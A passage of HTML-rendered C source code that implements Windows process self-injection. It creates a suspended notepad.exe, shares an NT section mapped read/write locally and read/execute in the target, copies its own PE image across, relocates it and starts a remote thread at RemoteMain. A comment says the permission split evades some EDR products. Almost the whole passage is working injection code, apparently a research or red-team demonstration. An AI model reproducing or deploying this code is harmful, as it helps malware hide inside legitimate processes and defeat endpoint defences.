//&nbsp;overwrite&nbsp;orignial&nbsp;value&nbsp;with&nbsp;modified&nbsp;value<br />				*relocAddr&nbsp;=&nbsp;modifiedValue;<br />				printf(&quot;modified&nbsp;value:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)*relocAddr);<br />			}<br />			else&nbsp;if&nbsp;(relocEntry-&gt;Type&nbsp;==&nbsp;IMAGE_REL_BASED_ABSOLUTE)<br />			{<br />				printf(&quot;type:&nbsp;ASBOLUTE&nbsp;-&nbsp;skipping&nbsp;relocation&nbsp;\n&quot;);<br />			}<br />			else<br />			{<br />				printf(&quot;type:&nbsp;%d&nbsp;(unsupported)&nbsp;-&nbsp;skipping&nbsp;relocation&nbsp;\n&quot;,&nbsp;relocEntry-&gt;Type);<br />			}<br /><br />			//&nbsp;advance&nbsp;to&nbsp;next&nbsp;entry<br />			relocEntry&nbsp;+=&nbsp;1;<br />		}<br /><br />		//&nbsp;advance&nbsp;to&nbsp;next&nbsp;block<br />		blockNumber&nbsp;+=&nbsp;1;<br />		relocTable_Position&nbsp;+=&nbsp;relocBlock-&gt;SizeOfBlock;<br />		relocBlock&nbsp;=&nbsp;(PIMAGE_BASE_RELOCATION)((DWORD64)relocBlock&nbsp;+&nbsp;relocBlock-&gt;SizeOfBlock);<br />	}<br /><br />	return&nbsp;0;<br />}<br /><br />/*<br />Inject&nbsp;code&nbsp;into&nbsp;a&nbsp;target&nbsp;process&nbsp;via&nbsp;a&nbsp;shared&nbsp;section&nbsp;map.<br />This&nbsp;variation&nbsp;injects&nbsp;itself&nbsp;(this&nbsp;PE)&nbsp;and&nbsp;starts&nbsp;exeuction&nbsp;at&nbsp;RemoteMain()&nbsp;with&nbsp;a&nbsp;new&nbsp;thread.<br /><br />x86&nbsp;debug&nbsp;doesn&#39;t&nbsp;work&nbsp;(app&nbsp;crash?/Werfault.exe-&nbsp;0xc0000005).<br />x64&nbsp;debug&nbsp;&amp;&nbsp;release&nbsp;work.<br /><br />Parmeters:<br />	target_Path&nbsp;-&nbsp;the&nbsp;target&nbsp;process&nbsp;to&nbsp;spawn&nbsp;&amp;&nbsp;inject&nbsp;into<br />Returns:<br />	1&nbsp;on&nbsp;failure.<br />	0&nbsp;on&nbsp;success.<br />*/<br />int&nbsp;InjectSelf_SharedSectionMap_NewThread(wchar_t&nbsp;target_Path[])<br />{<br />	NTSTATUS&nbsp;ntStatus;<br />	<br />	STARTUPINFOW&nbsp;target_si&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	PROCESS_INFORMATION&nbsp;target_pi&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	LPVOID&nbsp;target_SectionAddr&nbsp;=&nbsp;NULL;<br />	<br />	LPVOID&nbsp;local_BaseAddress;<br />	LPVOID&nbsp;local_SectionAddr&nbsp;=&nbsp;NULL;<br />	PIMAGE_DOS_HEADER&nbsp;local_DosHeader;<br />	PIMAGE_NT_HEADERS&nbsp;local_NtHeader;<br />	HANDLE&nbsp;local_SectionHandle&nbsp;=&nbsp;NULL;<br />	LARGE_INTEGER&nbsp;local_SectionSize&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	SIZE_T&nbsp;mappedView_Size&nbsp;=&nbsp;0;<br />	<br />	//&nbsp;create&nbsp;target&nbsp;process<br />	CreateProcessW(NULL,&nbsp;target_Path,&nbsp;NULL,&nbsp;NULL,&nbsp;FALSE,&nbsp;CREATE_SUSPENDED,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;target_si,&nbsp;&amp;target_pi);<br />	printf(&quot;[*]&nbsp;target&nbsp;process&nbsp;created:&nbsp;\&quot;%S\&quot;&nbsp;\n&quot;,&nbsp;target_Path);<br />	<br />	//&nbsp;grab&nbsp;our&nbsp;own&nbsp;base&nbsp;address&nbsp;&amp;&nbsp;image&nbsp;size<br />	local_BaseAddress&nbsp;=&nbsp;(LPVOID)GetModuleHandleW(NULL);<br /><br />	local_DosHeader&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)local_BaseAddress;<br />	local_NtHeader&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)local_BaseAddress&nbsp;+&nbsp;local_DosHeader-&gt;e_lfanew);<br />	local_SectionSize.LowPart&nbsp;=&nbsp;local_NtHeader-&gt;OptionalHeader.SizeOfImage;<br /><br />	//&nbsp;create&nbsp;new&nbsp;section&nbsp;in&nbsp;our&nbsp;own&nbsp;process<br />	ntStatus&nbsp;=&nbsp;d_NtCreateSection(&amp;local_SectionHandle,&nbsp;SECTION_MAP_READ&nbsp;|&nbsp;SECTION_MAP_WRITE&nbsp;|&nbsp;SECTION_MAP_EXECUTE,&nbsp;NULL,&nbsp;&amp;local_SectionSize,&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;SEC_COMMIT,&nbsp;NULL);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;new&nbsp;section&nbsp;in&nbsp;local&nbsp;process&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;new&nbsp;section&nbsp;created&nbsp;in&nbsp;local&nbsp;process&nbsp;\n&quot;);<br />	printf(&quot;\t&nbsp;size:&nbsp;%d&nbsp;\n&quot;,&nbsp;local_SectionSize.LowPart);<br /><br />	//&nbsp;create&nbsp;a&nbsp;section&nbsp;view&nbsp;in&nbsp;our&nbsp;own&nbsp;process<br />	//&nbsp;r/w&nbsp;permissions&nbsp;are&nbsp;set&nbsp;in&nbsp;the&nbsp;local&nbsp;section&nbsp;because&nbsp;we&nbsp;don&#39;t&nbsp;need&nbsp;to&nbsp;execute&nbsp;code&nbsp;here<br />	ntStatus&nbsp;=&nbsp;d_NtMapViewOfSection(local_SectionHandle,&nbsp;GetCurrentProcess(),&nbsp;&amp;local_SectionAddr,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;&amp;mappedView_Size,&nbsp;ViewUnmap,&nbsp;0,&nbsp;PAGE_READWRITE);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;map&nbsp;view&nbsp;of&nbsp;section&nbsp;in&nbsp;local&nbsp;process&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;mapped&nbsp;r/w&nbsp;view&nbsp;in&nbsp;local&nbsp;process&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;local_SectionAddr);<br /><br />	//&nbsp;create&nbsp;a&nbsp;section&nbsp;view&nbsp;(of&nbsp;the&nbsp;section&nbsp;view&nbsp;in&nbsp;our&nbsp;own&nbsp;process)&nbsp;in&nbsp;the&nbsp;target&nbsp;process<br />	//&nbsp;now&nbsp;any&nbsp;changes&nbsp;to&nbsp;the&nbsp;section&nbsp;view&nbsp;in&nbsp;our&nbsp;own&nbsp;process&nbsp;will&nbsp;also&nbsp;happen&nbsp;to&nbsp;the&nbsp;section&nbsp;view&nbsp;in&nbsp;the&nbsp;target&nbsp;process<br />	//&nbsp;r/x&nbsp;permissions&nbsp;set&nbsp;in&nbsp;target&nbsp;process,&nbsp;which&nbsp;evades&nbsp;some&nbsp;EDRs&nbsp;that&nbsp;dont&#39;&nbsp;like&nbsp;r/w/x&nbsp;permissions<br />	ntStatus&nbsp;=&nbsp;d_NtMapViewOfSection(local_SectionHandle,&nbsp;target_pi.hProcess,&nbsp;&amp;target_SectionAddr,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;&amp;mappedView_Size,&nbsp;ViewUnmap,&nbsp;0,&nbsp;PAGE_EXECUTE_READ);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;map&nbsp;view&nbsp;of&nbsp;section&nbsp;in&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;\t&nbsp;mapped&nbsp;r/x&nbsp;view&nbsp;in&nbsp;target&nbsp;process&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_SectionAddr);<br /><br />	//&nbsp;copy&nbsp;ourself&nbsp;(this&nbsp;PE)&nbsp;into&nbsp;the&nbsp;local&nbsp;section<br />	//&nbsp;(because&nbsp;we&nbsp;changed&nbsp;the&nbsp;section&nbsp;view&nbsp;in&nbsp;our&nbsp;own&nbsp;process,&nbsp;this&nbsp;PE&nbsp;will&nbsp;also&nbsp;be&nbsp;copied&nbsp;into&nbsp;the&nbsp;target&nbsp;process&nbsp;as&nbsp;well)<br />	memcpy(local_SectionAddr,&nbsp;local_BaseAddress,&nbsp;local_NtHeader-&gt;OptionalHeader.SizeOfImage);<br />	printf(&quot;\t&nbsp;copied&nbsp;self&nbsp;into&nbsp;local&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;local_SectionAddr);<br />	printf(&quot;\t&nbsp;mirror&nbsp;of&nbsp;self&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_SectionAddr);<br /><br />	//&nbsp;perform&nbsp;base&nbsp;relocations<br />#ifdef&nbsp;_WIN64<br />	relocatePE_64(local_SectionAddr,&nbsp;target_SectionAddr);<br />#else<br />	relocatePE_32(local_SectionAddr,&nbsp;target_SectionAddr);<br />#endif<br /><br />	//&nbsp;calculate&nbsp;address&nbsp;of&nbsp;RemoteMain()<br />	DWORD_PTR&nbsp;RemoteMain_Offset&nbsp;=&nbsp;(DWORD_PTR)&amp;RemoteMain&nbsp;-&nbsp;(DWORD_PTR)local_BaseAddress;<br />	LPVOID&nbsp;localSection_RemoteMain&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)local_SectionAddr&nbsp;+&nbsp;RemoteMain_Offset);<br />	LPVOID&nbsp;targetSection_RemoteMain&nbsp;=&nbsp;(LPVOID)((DWORD_PTR)target_SectionAddr&nbsp;+&nbsp;RemoteMain_Offset);<br />	<br />	printf(&quot;[*]&nbsp;RemoteMain&nbsp;\n&quot;);<br />	printf(&quot;\t&nbsp;offset:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;(LPVOID)RemoteMain_Offset);<br />	printf(&quot;\t&nbsp;in&nbsp;local:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;localSection_RemoteMain);<br />	printf(&quot;\t&nbsp;in&nbsp;target:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;targetSection_RemoteMain);<br />	printf(&quot;[*]&nbsp;starting&nbsp;remote&nbsp;thread&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;targetSection_RemoteMain);<br />	<br />	//&nbsp;create&nbsp;new&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;that&nbsp;executes&nbsp;RemoteMain<br />	HANDLE&nbsp;target_SectionThread&nbsp;=&nbsp;NULL;<br />	ntStatus&nbsp;=&nbsp;d_RtlCreateUserThread(target_pi.hProcess,&nbsp;NULL,&nbsp;FALSE,&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;targetSection_RemoteMain,&nbsp;NULL,&nbsp;target_SectionThread,&nbsp;NULL);<br />	if&nbsp;(NT_SUCCESS(ntStatus)&nbsp;!=&nbsp;TRUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	/*<br />	If&nbsp;execution&nbsp;fails,&nbsp;<br />	you&nbsp;should&nbsp;unmap&nbsp;section&nbsp;from&nbsp;the&nbsp;target&nbsp;process&nbsp;and&nbsp;local&nbsp;process&nbsp;and&nbsp;terminate&nbsp;the&nbsp;target&nbsp;process.<br />	*/<br />	//&nbsp;clean&nbsp;up<br />	CloseHandle(target_pi.hProcess);<br />	CloseHandle(target_pi.hThread);<br />	<br />	return&nbsp;0;<br />}<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	int&nbsp;iRet&nbsp;=&nbsp;resolveNtFunctions();<br />	if&nbsp;(iRet&nbsp;!=&nbsp;0)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;resolve&nbsp;NT&nbsp;function:&nbsp;%d&nbsp;\n&quot;,&nbsp;iRet);<br />		return&nbsp;1;<br />	}<br />	printf(&quot;[*]&nbsp;resolved&nbsp;NT&nbsp;imports&nbsp;\n&quot;);<br />		<br />	wchar_t&nbsp;target_Path[]&nbsp;=&nbsp;L&quot;notepad.exe&quot;;<br />	InjectSelf_SharedSectionMap_NewThread(target_Path);<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
